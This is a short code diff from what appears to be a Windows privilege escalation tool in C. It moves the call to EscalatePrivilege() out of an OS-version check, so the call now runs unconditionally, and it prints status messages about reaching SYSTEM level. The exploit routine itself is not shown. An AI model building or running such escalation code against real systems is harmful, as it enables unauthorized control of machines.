@@ -63,21 +63,18 @@ int main() {
 	#endif
 #endif
 
-	if (GetOSInfo())
-	{
-		printf("Escalating Privileges...\n");
-		Sleep(2000);
-		int epResult = EscalatePrivilege();
-		printf("Result of Privilege Escalation : %d\n", epResult);
-
-		if (epResult == RTN_OK)
-			printf("Successfully Escalated privileges to SYSTEM level...\n");
-	}
-	else
-	{
+	if (!GetOSInfo()) {
 		printf("Failed to get Windows NT version\n");
 		printf("LastError: 0x%x\n", GetLastError());
 	}
+	
+	printf("escalating Privileges...\n");
+	Sleep(2000);
+	int epResult = EscalatePrivilege();
+	printf("Result of Privilege Escalation : %d\n", epResult);
+
+	if (epResult == RTN_OK)
+		printf("Successfully Escalated privileges to SYSTEM level...\n");
 
 	DWORD PID = 0;
 	while (!PID)
